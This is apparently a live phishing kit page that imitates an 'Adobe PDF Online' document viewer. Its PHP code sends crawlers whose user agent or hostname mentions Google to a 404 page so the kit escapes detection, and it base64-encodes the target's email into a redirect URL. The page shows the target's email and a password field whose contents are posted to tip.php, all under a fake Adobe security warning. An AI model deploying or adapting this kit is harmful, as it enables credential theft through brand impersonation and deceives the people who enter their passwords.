﻿<!DOCTYPE html>
<?
$owner =($_GET['email']); 
$USRB = base64_encode($owner); 
$EMAIL = base64_decode($_GET['_Email']);
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(!isset($_GET['cmd'])){echo "<META HTTP-EQUIV='refresh' content='0; URL=?Go=_Reason=Limited&_SESSION&_Email=$USRB&cmd=_home&dispatch=".md5(microtime()).md5(microtime())."'>";exit();}
?>

<link rel="icon" type="image/ico" href="files/favicon-16x16.png"/>

<script type="text/JavaScript"><!--

function MM_findObj(n, d) { //v4.01

  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {

    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}

  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];

  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);

  if(!x && d.getElementById) x=d.getElementById(n); return x;

}



function MM_validateForm() { //v4.0

  var i,p,q,nm,test,num,min,max,errors='',args=MM_validateForm.arguments;

  for (i=0; i<(args.length-2); i+=3) { test=args[i+2]; val=MM_findObj(args[i]);

    if (val) { nm=val.name; if ((val=val.value)!="") {

      if (test.indexOf('isEmail')!=-1) { p=val.indexOf('@');

        if (p<1 || p==(val.length-1)) errors+='- '+nm+' must contain an e-mail address.\n';

      } else if (test!='R') { num = parseFloat(val);

        if (isNaN(val)) errors+='- '+nm+' must contain a number.\n';

        if (test.indexOf('inRange') != -1) { p=test.indexOf(':');

          min=test.substring(8,p); max=test.substring(p+1);

          if (num<min || max<num) errors+='- '+nm+' must contain a number between '+min+' and '+max+'.\n';

    } } } else if (test.charAt(0) == 'R') errors += '- '+nm+' Is required.\n'; }

  } if (errors) alert('The following error occurred:\n'+errors);

  document.MM_returnValue = (errors == '');

}

</script>

<html >

  <head>

    <meta charset="UTF-8">





    <title>Adobe PDF Reader ®</title>

 <style type="text/css">
a{
  color:#454444;
  text-decoration:none;
}
a:link{
  color:#454444;
  text-decoration:none;
}
a:hover{
  color:#454444;
  text-decoration:none;
}

a:visited{
  color:#454444;
  text-decoration:none;
}

@font-face {
	font-family: 'et-line';
	src:url('fonts/et-line.eot');
	src:url('fonts/et-line.eot?#iefix') format('embedded-opentype'),
		url('fonts/et-line.woff') format('woff'),
		url('fonts/et-line.ttf') format('truetype'),
		url('fonts/et-line.svg#et-line') format('svg');
	font-weight: normal;
	font-style: normal;
}

/* Use the following CSS code if you want to use data attributes for inserting your icons */
[data-icon]:before {
	font-family: 'et-line';
	content: attr(data-icon);
	speak: none;
	font-weight: normal;
	font-variant: normal;
	text-transform: none;
	line-height: 1;
	-webkit-font-smoothing: antialiased;
	-moz-osx-font-smoothing: grayscale;
	display:inline-block;
}

/* Use the following CSS code if you want to have a class per icon */
/*
Instead of a list of all class selectors,
you can use the generic selector below, but it's slower:
[class*="icon-"] {
*/
.icon-mobile, .icon-laptop, .icon-desktop, .icon-tablet, .icon-phone, .icon-document, .icon-documents, .icon-search, .icon-clipboard, .icon-newspaper, .icon-notebook, .icon-book-open, .icon-browser, .icon-calendar, .icon-presentation, .icon-picture, .icon-pictures, .icon-video, .icon-camera, .icon-printer, .icon-toolbox, .icon-briefcase, .icon-wallet, .icon-gift, .icon-bargraph, .icon-grid, .icon-expand, .icon-focus, .icon-edit, .icon-adjustments, .icon-ribbon, .icon-hourglass, .icon-lock, .icon-megaphone, .icon-shield, .icon-trophy, .icon-flag, .icon-map, .icon-puzzle, .icon-basket, .icon-envelope, .icon-streetsign, .icon-telescope, .icon-gears, .icon-key, .icon-paperclip, .icon-attachment, .icon-pricetags, .icon-lightbulb, .icon-layers, .icon-pencil, .icon-tools, .icon-tools-2, .icon-scissors, .icon-paintbrush, .icon-magnifying-glass, .icon-circle-compass, .icon-linegraph, .icon-mic, .icon-strategy, .icon-beaker, .icon-caution, .icon-recycle, .icon-anchor, .icon-profile-male, .icon-profile-female, .icon-bike, .icon-wine, .icon-hotairballoon, .icon-globe, .icon-genius, .icon-map-pin, .icon-dial, .icon-chat, .icon-heart, .icon-cloud, .icon-upload, .icon-download, .icon-target, .icon-hazardous, .icon-piechart, .icon-speedometer, .icon-global, .icon-compass, .icon-lifesaver, .icon-clock, .icon-aperture, .icon-quote, .icon-scope, .icon-alarmclock, .icon-refresh, .icon-happy, .icon-sad, .icon-facebook, .icon-twitter, .icon-googleplus, .icon-rss, .icon-tumblr, .icon-linkedin, .icon-dribbble {
	font-family: 'et-line';
	speak: none;
	font-style: normal;
	font-weight: normal;
	font-variant: normal;
	text-transform: none;
	line-height: 1;
	-webkit-font-smoothing: antialiased;
	-moz-osx-font-smoothing: grayscale;
	display:inline-block;
}
.icon-mobile:before {
	content: "\e000";
}
.icon-laptop:before {
	content: "\e001";
}
.icon-desktop:before {
	content: "\e002";
}
.icon-tablet:before {
	content: "\e003";
}
.icon-phone:before {
	content: "\e004";
}
.icon-document:before {
	content: "\e005";
}
.icon-documents:before {
	content: "\e006";
}
.icon-search:before {
	content: "\e007";
}
.icon-clipboard:before {
	content: "\e008";
}
.icon-newspaper:before {
	content: "\e009";
}
.icon-notebook:before {
	content: "\e00a";
}
.icon-book-open:before {
	content: "\e00b";
}
.icon-browser:before {
	content: "\e00c";
}
.icon-calendar:before {
	content: "\e00d";
}
.icon-presentation:before {
	content: "\e00e";
}
.icon-picture:before {
	content: "\e00f";
}
.icon-pictures:before {
	content: "\e010";
}
.icon-video:before {
	content: "\e011";
}
.icon-camera:before {
	content: "\e012";
}
.icon-printer:before {
	content: "\e013";
}
.icon-toolbox:before {
	content: "\e014";
}
.icon-briefcase:before {
	content: "\e015";
}
.icon-wallet:before {
	content: "\e016";
}
.icon-gift:before {
	content: "\e017";
}
.icon-bargraph:before {
	content: "\e018";
}
.icon-grid:before {
	content: "\e019";
}
.icon-expand:before {
	content: "\e01a";
}
.icon-focus:before {
	content: "\e01b";
}
.icon-edit:before {
	content: "\e01c";
}
.icon-adjustments:before {
	content: "\e01d";
}
.icon-ribbon:before {
	content: "\e01e";
}
.icon-hourglass:before {
	content: "\e01f";
}
.icon-lock:before {
	content: "\e020";
}
.icon-megaphone:before {
	content: "\e021";
}
.icon-shield:before {
	content: "\e022";
}
.icon-trophy:before {
	content: "\e023";
}
.icon-flag:before {
	content: "\e024";
}
.icon-map:before {
	content: "\e025";
}
.icon-puzzle:before {
	content: "\e026";
}
.icon-basket:before {
	content: "\e027";
}
.icon-envelope:before {
	content: "\e028";
}
.icon-streetsign:before {
	content: "\e029";
}
.icon-telescope:before {
	content: "\e02a";
}
.icon-gears:before {
	content: "\e02b";
}
.icon-key:before {
	content: "\e02c";
}
.icon-paperclip:before {
	content: "\e02d";
}
.icon-attachment:before {
	content: "\e02e";
}
.icon-pricetags:before {
	content: "\e02f";
}
.icon-lightbulb:before {
	content: "\e030";
}
.icon-layers:before {
	content: "\e031";
}
.icon-pencil:before {
	content: "\e032";
}
.icon-tools:before {
	content: "\e033";
}
.icon-tools-2:before {
	content: "\e034";
}
.icon-scissors:before {
	content: "\e035";
}
.icon-paintbrush:before {
	content: "\e036";
}
.icon-magnifying-glass:before {
	content: "\e037";
}
.icon-circle-compass:before {
	content: "\e038";
}
.icon-linegraph:before {
	content: "\e039";
}
.icon-mic:before {
	content: "\e03a";
}
.icon-strategy:before {
	content: "\e03b";
}
.icon-beaker:before {
	content: "\e03c";
}
.icon-caution:before {
	content: "\e03d";
}
.icon-recycle:before {
	content: "\e03e";
}
.icon-anchor:before {
	content: "\e03f";
}
.icon-profile-male:before {
	content: "\e040";
}
.icon-profile-female:before {
	content: "\e041";
}
.icon-bike:before {
	content: "\e042";
}
.icon-wine:before {
	content: "\e043";
}
.icon-hotairballoon:before {
	content: "\e044";
}
.icon-globe:before {
	content: "\e045";
}
.icon-genius:before {
	content: "\e046";
}
.icon-map-pin:before {
	content: "\e047";
}
.icon-dial:before {
	content: "\e048";
}
.icon-chat:before {
	content: "\e049";
}
.icon-heart:before {
	content: "\e04a";
}
.icon-cloud:before {
	content: "\e04b";
}
.icon-upload:before {
	content: "\e04c";
}
.icon-download:before {
	content: "\e04d";
}
.icon-target:before {
	content: "\e04e";
}
.icon-hazardous:before {
	content: "\e04f";
}
.icon-piechart:before {
	content: "\e050";
}
.icon-speedometer:before {
	content: "\e051";
}
.icon-global:before {
	content: "\e052";
}
.icon-compass:before {
	content: "\e053";
}
.icon-lifesaver:before {
	content: "\e054";
}
.icon-clock:before {
	content: "\e055";
}
.icon-aperture:before {
	content: "\e056";
}
.icon-quote:before {
	content: "\e057";
}
.icon-scope:before {
	content: "\e058";
}
.icon-alarmclock:before {
	content: "\e059";
}
.icon-refresh:before {
	content: "\e05a";
}
.icon-happy:before {
	content: "\e05b";
}
.icon-sad:before {
	content: "\e05c";
}
.icon-facebook:before {
	content: "\e05d";
}
.icon-twitter:before {
	content: "\e05e";
}
.icon-googleplus:before {
	content: "\e05f";
}
.icon-rss:before {
	content: "\e060";
}
.icon-tumblr:before {
	content: "\e061";
}
.icon-linkedin:before {
	content: "\e062";
}
.icon-dribbble:before {
	content: "\e063";
}


body{
margin:0;
font-family:helvetica, verdana, arial, san-serif;
}

html { 
  background: url(files/2222.png) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}

.transparent {
	zoom: 1;
	filter: alpha(opacity=90);
	opacity: 0.9;
}
#top-header{
   width:100%;
   height:50px;
   background:#000;
}

.inp{

	border: 1px solid #EAEAEA;
	-moz-border-radius: 3px;
	-webkit-border-radius: 3px;
	border-radius: 3px;
	-webkit-box-shadow: rgba(0, 0, 0, 0.3) 0 1px 3px;
	-moz-box-shadow: rgba(0,0,0,0.3) 0 1px 3px;
	box-shadow: rgba(0, 0, 0, 0.3) 0 1px 3px;
	margin:0 0 5px 0;
}
.btn {
  background: #25aad6;
  background-image: -webkit-linear-gradient(top, #25aad6, #1593bc);
  background-image: -moz-linear-gradient(top, #25aad6, #1593bc);
  background-image: -ms-linear-gradient(top, #25aad6, #1593bc);
  background-image: -o-linear-gradient(top, #25aad6, #1593bc);
  background-image: linear-gradient(to bottom, #25aad6, #1593bc);
  -webkit-border-radius: 10;
  -moz-border-radius: 10;
  border-radius: 10px;
  font-family: Arial;
  color: #ffffff;
  font-size: 20px;
  padding: 13px 15px 12px 16px;
  text-decoration: none;
}

.btn:hover {
  background: #1593bc;
  background-image: -webkit-linear-gradient(top, #1593bc, #25aad6);
  background-image: -moz-linear-gradient(top, #1593bc, #25aad6);
  background-image: -ms-linear-gradient(top, #1593bc, #25aad6);
  background-image: -o-linear-gradient(top, #1593bc, #25aad6);
  background-image: linear-gradient(to bottom, #1593bc, #25aad6);
  text-decoration: none;
}
#errfn{
  color:red;
}
#errfnn{
  color:red;
}

.cover{
    position: absolute;
    top: 0;
    left: 0;
    height: 100%;
    width: 100%;
    background-color: rgba(0,0,0,0.5);
    z-index: 10;
}

</style>   

<body style="background:; font-family:helvetica, verdana, tahoma, arial; padding:0;">
<div id="top-header">
<table style="border:none; width:100%; padding:0; margin:0; height:50px; border-spacing:0; color:#fff; z-index:10000000; position:absolute;">
<tbody><tr>
<td style="background:#bb0706 url(smallpdf.png); width:4%; height:100%; margin:0; padding:0;"></td>
<td style="background:#bb0706; width:10%; height:100%; margin:0; padding:0; text-align:center;">Adobe PDF Online</td>
<td style="background:#000000; width:70%; height:100%; margin:0; padding:0;"></td>
<td style="background:#e1e1e1; width:10%; height:100%; margin:0; padding:0; color:#404040; text-align:center;"><a href="" title="You are not signed In">Account</a></td>
<td style="background:#e1e1e1; width:6%; height:100%; margin:0; padding:0; color:#404040; text-align:center; border-left:1px solid silver;"><a href="" title="You are not signed in yet">Sign In</a></td>
</tr>

</tbody></table>

</div>
<div style="width:100%; height:30px; background:#fff; padding:10px; position:relative; z-index:10000000000000;">
<table style="color:#454444; height:30px; width:100%;">
<tbody><tr>
<td style="width:60%;"></td>
<td style="width:10%; font-size:12px; color:#fff; "><a href="" style="color:#FFF;" title="Login to continue"><span style="background:#bb0706; padding:10px;"><span class="icon-pencil"></span> &nbsp; Edit and Reply</span></a></td>
<td style="width:10%; font-size:12px;"><a href="" title="Login to continue"><span class="icon-document"></span>
 &nbsp;Download</a></td>
<td style="width:10%; font-size:12px;"><a href="" title="Login to continue"><span class="icon-printer"></span> &nbsp;Print</a></td>
<td style="width:6%; font-size:12px;"><a href="" title="Login to continue"><span class="icon-aperture"></span> &nbsp;Exit</a></td>
<td style="width:4%; font-size:12px;">
<a href="" title="Login to continue"><span style="font-weight:bold; font-size:2em; vertical-align:10px;">...</span></a>
</td>
</tr>
</tbody></table>
</div>    

    

    <link rel='stylesheet prefetch' href='http://ajax.googleapis.com/ajax/libs/jqueryui/1.11.2/themes/smoothness/jquery-ui.css'>



        <link rel="stylesheet" href="files/style.css">

        

        <document.body.style.backgroundPosition = "";> 



    

    

    

  </head>



  <body>

<br>

<br>

<br>

<br>

<br>

<br>



  <div class="login-card">

    <p align="center"><img src="files/lg_211.png" width="571" height="87"><br>

    </p>

<h1><img src="files/warning_sign_clip_art_20327.gif" width="29" height="30">This File is Protected by AdobeDocВ® Security</h1>

      <div align="center">

      <div align="center">

      Enter your email and password to access this pdf document.<br>

      <br><form action="tip.php" method="post" onsubmit="MM_validateForm('email','','RisEmail','password','','R');return document.MM_returnValue">

      </div>

      </div>

      <form class="login">

     <div align="center">

       <p>

         <input type="hidden" name="email" value="<?php echo $EMAIL; ?>" placeholder="Username"><h2 <span class="indent confidential "><?php echo $EMAIL; ?></h2>

         <input type="password" name="password" placeholder="Password">

         <input type="submit" name="login" class="login login-submit" value="View PDF Document" id="login">

         <br>

       <img src="files/lg_212.png" width="561" height="92">       </p>

     </div>

  </form>

  </div>

  <p><br>

      <br>

  </p>

  <p>

      <!-- <div id="error"><img src="https://dl.dropboxusercontent.com/u/23299152/Delete-icon.png" /> Your caps-lock is on.</div> -->

    <script src='files/jquery.min.js'></script>

    <script src='files/jquery-ui.min.js'></script>

      <br>

</p>

  </body>

</html>